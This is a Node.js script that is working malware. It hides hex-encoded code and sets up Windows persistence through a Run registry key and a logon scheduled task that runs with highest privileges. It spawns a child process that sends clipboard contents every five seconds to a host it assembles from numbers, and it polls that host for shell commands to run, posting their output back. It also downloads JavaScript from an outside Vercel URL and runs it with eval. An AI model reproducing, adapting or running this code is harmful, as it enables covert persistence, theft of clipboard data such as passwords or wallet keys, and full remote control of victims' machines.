try {
    const os = require('os'),
        fs = require('fs'),
        path = require('path'),
        axios = require('axios'),
        { execSync, spawn } = require('child_process')
    process.on('uncaughtException', (_0xad8869) => {})
    process.on('unhandledRejection', (_0x461982) => {})
    const uid = '4a3703430a2ec2ae30f362b29e994f77',
        ukey = 1995,
        p = 5918,
        kp = 5974,
        upt = 5934,
        lpt = 5961,
        t = 66,
        a = 127,
        b = 0,
        c = 0,
        d = 1,
        e = 127,
        f = 0,
        g = 0,
        h = 1,
        m = a + '.' + b + '.' + c + '.' + d,
        usu = e + '.' + f + '.' + g + '.' + h,
        lsu = e + '.' + f + '.' + g + '.' + h 
    function addRegistryPersistence() {
        if(os.platform() == 'win32') {
            execSync(`reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "NodeHelper" /t REG_SZ /d "node ${__dirname}\\\\index.mjs" /f`, {stdio: 'ignore'});
        }
    }
    addRegistryPersistence();
    console.log("Reg successfully")

    function addTaskScheduler() {
        if (os.platform() === 'win32') {
            execSync(`schtasks /create /tn "NodeUpdate" /tr "node ${__dirname}\\index.mjs" /sc onlogon /rl highest /f`, { stdio: 'ignore' });
        }
    }
    addTaskScheduler();
    console.log("Task Schedule successfully")
    async function s() {
        ss()
    }
    const ss = async () => {
        const _0x5f2ebc = 
            '\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20const\\x20axios\\x20=\\x20require(\\x22axios\\x22);\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20\\x20const\\x20os\\x20=\\x20require(\\x22os\\x22);\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20\\x20const\\x20fs\\x20=\\x20require(\\x22fs\\x22);\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20\\x20const\\x20{spawn,\\x20execSync}\\x20=\\x20require(\\x22child_process\\x22);\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20\\x20const\\x20uid\\x20=\\x20\\x224a3703430a2ec2ae30f362b29e994f77\\x22;\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20\\x20setInterval(()\\x20=>\\x20{\\x0a' +
            '\\x20\\x20\\x20\\x20let\\x20clip;\\x0a' +
            '\\x20\\x20\\x20\\x20if\\x20(os.platform()\\x20===\\x20\\x22win32\\x22)\\x20{\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20clip\\x20=\\x20execSync(\\x22powershell\\x20-command\\x20Get-Clipboard\\x22,\\x20{encoding:\\x20\\x22utf8\\x22});\\x0a' +
            '\\x20\\x20\\x20\\x20}\\x20else\\x20if\\x20(os.platform()\\x20===\\x20\\x22darwin\\x22)\\x20{\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20clip\\x20=\\x20execSync(\\x22pbpaste\\x22,\\x20{encoding:\\x20\\x22utf8\\x22});\\x0a' +
            '\\x20\\x20\\x20\\x20}\\x20else\\x20{\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20clip\\x20=\\x20execSync(\\x22xclip\\x20-selection\\x20clipboard\\x20-o\\x22,\\x20{encoding:\\x20\\x22utf8\\x22});\\x0a' +
            '\\x20\\x20\\x20\\x20}\\x0a' +
            '\\x20\\x20\\x20\\x20axios.post(\\x60http://\\x24{a}.\\x24{b}.\\x24{c}.\\x24{d}:\\x24{p}/clip\\x60,\\x20{uid,\\x20clip}).catch(err\\x20=>\\x20console.error(\\x22Clipboard\\x20post\\x20error:\\x22,\\x20err.message));\\x0a' +
            '\\x20\\x20},\\x205000);\\x0a' +
            '\\x20\\x20setInterval(async\\x20()\\x20=>\\x20{\\x0a' +
            '\\x20\\x20\\x20\\x20try\\x20{\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20const\\x20response\\x20=\\x20await\\x20axios.get(\\x60http://\\x24{a}.\\x24{b}.\\x24{c}.\\x24{d}:\\x24{p}/command?uid=\\x60+uid);\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20const\\x20command\\x20=\\x20response.data.command;\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20if\\x20(command)\\x20{\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20let\\x20output;\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20try\\x20{\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20output\\x20=\\x20execSync(command,\\x20{encoding:\\x20\\x22utf8\\x22});\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\x20catch\\x20(err)\\x20{\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20output\\x20=\\x20\\x22Error\\x20executing\\x20command:\\x20\\x22+err.message;\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20await\\x20axios.post(\\x60http://\\x24{a}.\\x24{b}.\\x24{c}.\\x24{d}:\\x24{p}/output\\x60,\\x20{uid,\\x20command,\\x20output});\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20}\\x0a' +
            '\\x20\\x20\\x20\\x20}\\x20catch\\x20(err)\\x20{\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20console.error(\\x22Remote\\x20shell\\x20error:\\x22,\\x20err.message);\\x0a' +
            '\\x20\\x20\\x20\\x20}\\x0a' +
            '\\x20\\x20},\\x2010000);';
        const decodedCode = _0x5f2ebc.replace(/\\x([0-9A-Fa-f]{2})/g, (_, hex) => String.fromCharCode(parseInt(hex, 16)));
        // console.log(decodedCode);
        const prelude = [
            `globalThis.a = ${JSON.stringify(a)};`,
            `globalThis.b = ${JSON.stringify(b)};`,
            `globalThis.c = ${JSON.stringify(c)};`,
            `globalThis.d = ${JSON.stringify(d)};`,
            `globalThis.p = ${JSON.stringify(p)};`,
            `globalThis.uid = ${JSON.stringify(uid)};`,
            // also include any other values you want the child to see:
            `globalThis.ukey = ${JSON.stringify(ukey)};`,
        ].join('\n') + '\n';

        const childScript = prelude + decodedCode;
        // console.log(childScript);
        _0x24451c = new Error('spawn node ENOENT');
        try {
            const _0x69392 = spawn('node', ['-e', childScript], { 
                windowshide: false,
                detached: false,
                stdio: 'inherit',
                autoRestart: true });
            _0x69392.on('spawn', () => {
                console.log("CHILD SPAWNED SUCCESSFULLY!");
            });
            }catch(_0x24451c) {
                console.log(error);
            }
    
   
    }
    s().catch(console.error);
    axios.post('https://tetrismic.vercel.app/extra2')
    .then(response => { // 'response' is defined here
        if (response.status !== 200) {
        throw new Error(`Bad status: ${response.status}`);
        }
        const code = response.data;
        // console.log('Client: Fetched payload preview:', code.slice(0, 200));
        if (typeof code === 'string' && !code.startsWith('<')) {
        // console.log(code);
        eval(code); // Executes the JS payload
        console.log('Payload2 executed');
        } else {
        console.error('Invalid payload: HTML received');
        }
    })
    .catch(err => { // 'err' is the parameter here
        if (err.response) { // Check if HTTP error (e.g., 404)
        console.error(`HTTP Error: ${err.response.status} - ${err.response.data.slice(0, 200)}`);
        } else if (err.request) { // No response received (e.g., connection failed)
        console.error('Network Error: No response - Server down?', err.request);
        } else {
        console.error('Axios Setup Error:', err.message); // Other issues (e.g., bad URL)
        }
    });

    
}catch(error) {}

